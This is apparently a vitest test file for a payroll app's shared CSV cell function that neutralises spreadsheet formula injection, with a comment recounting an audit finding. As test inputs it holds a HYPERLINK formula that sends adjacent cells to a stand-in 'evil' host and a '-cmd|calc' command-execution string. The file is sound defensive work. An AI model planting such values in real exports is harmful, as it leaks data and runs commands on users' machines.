/**
 * A spreadsheet runs a cell that starts with = + - @ (or a tab or CR) as a formula.
 *
 * Every export except the bank file wrote user-controlled text -- employee names,
 * departments, journal narrations, project names -- straight into a CSV, quoting only
 * for commas. A colleague named `=HYPERLINK("http://evil/?"&A1,"open")` turned the payroll
 * register HR opens on Monday into a way to leak the cells beside it. The bank file had a
 * guard; seven other writers each re-implemented the quoting without it. One shared cell
 * function now, and a scan that fails if anyone writes another. Found by an audit.
 */
import { describe, it, expect } from 'vitest'
import { readdirSync, readFileSync, statSync } from 'node:fs'
import { join } from 'node:path'
import { csvCell } from '../src/lib/csv.ts'
import { musterCsv, type Muster } from '../src/attendance/muster.ts'
import { journalCsv, type Journal } from '../src/payroll/journal.ts'

describe('csvCell', () => {
  it('neutralises every formula trigger with a leading apostrophe', () => {
    for (const bad of ['=1+1', '+1+1', '-1+1', '@SUM(A1)', '\t=1', '\r=1', '=HYPERLINK("http://x","y")']) {
      expect(csvCell(bad), bad).toMatch(/^"?'/)
    }
  })

  it('leaves ordinary text and numbers alone', () => {
    expect(csvCell('Rahul Sharma')).toBe('Rahul Sharma')
    expect(csvCell(26133)).toBe('26133')
    expect(csvCell(0)).toBe('0')
    expect(csvCell(null)).toBe('')
    expect(csvCell(undefined)).toBe('')
  })

  it('does not corrupt a negative amount: -1867 is a number, not a formula', () => {
    // A reversal in the journal, a recovery on a payslip. Prefixing it would turn a
    // figure into text and break every sum over the column.
    expect(csvCell(-1867)).toBe('-1867')
    expect(csvCell('-1867')).toBe('-1867')
    expect(csvCell('-1867.50')).toBe('-1867.50')
    expect(csvCell(-1867n)).toBe('-1867')
  })

  it('still guards a leading minus that is not a plain number', () => {
    expect(csvCell('-cmd|calc')).toBe("'-cmd|calc")
    expect(csvCell('-1+1')).toBe("'-1+1")
  })

  it('quotes for commas, quotes and line breaks -- after neutralising', () => {
    expect(csvCell('a,b')).toBe('"a,b"')
    expect(csvCell('say "hi"')).toBe('"say ""hi"""')
    expect(csvCell('line1\nline2')).toBe('"line1\nline2"')
    expect(csvCell('=A1,B1')).toBe(`"'=A1,B1"`)
  })
})

describe('the writers that used to lack the guard', () => {
  const hostile = '=HYPERLINK("http://evil/?"&A1,"open")'
  const expectNeutral = (csv: string) => {
    expect(csv).not.toMatch(/(^|,|\n)"?=HYPERLINK/)
    expect(csv).toContain(`'=HYPERLINK`)
  }

  it('muster', () => {
    const m = {
      days: ['2026-09-01'],
      rows: [{
        employeeNumber: 'E1', name: hostile, department: '@dept', designation: '+d',
        days: [{ code: 'P' }],
        totals: { present: 1, half: 0, absent: 0, leave: 0, unpaidLeave: 0, weeklyOff: 0, holiday: 0, onDuty: 0, remote: 0, unmarked: 0, late: 0, otHours: 0, payable: 1, lop: 0 },
      }],
    } as unknown as Muster
    expectNeutral(musterCsv(m))
  })

  it('journal', () => {
    const j = {
      date: '2026-09-30', totalDebitPaise: 0n, totalCreditPaise: 0n, balanced: true, unmapped: [], runId: 'r', period: '2026-09',
      lines: [{ account: hostile, costCentre: '=cc', debitPaise: 100n, creditPaise: 0n, narration: '@narr' }],
    } as unknown as Journal
    expectNeutral(journalCsv(j))
  })
})

describe('nobody writes another one', () => {
  const walk = (dir: string): string[] => readdirSync(dir).flatMap((f) => {
    const p = join(dir, f)
    return statSync(p).isDirectory() ? walk(p) : p.endsWith('.ts') ? [p] : []
  })
  // The quote-doubling regex is the fingerprint of a hand-rolled CSV cell.
  const HANDROLLED = /replace\(\s*\/"\/g\s*,\s*['"]\\?"\\?"['"]\s*\)|replaceAll\(\s*'"'\s*,\s*'""'\s*\)/

  it('outside src/lib/csv.ts (and the always-quoted bank file, which carries its own guard)', () => {
    const offenders = walk('src')
      .filter((f) => !/[\\/]lib[\\/]csv\.ts$/.test(f) && !/[\\/]payments[\\/]bank-file\.ts$/.test(f))
      .filter((f) => HANDROLLED.test(readFileSync(f, 'utf8')))
    expect(offenders).toEqual([])
  })
})
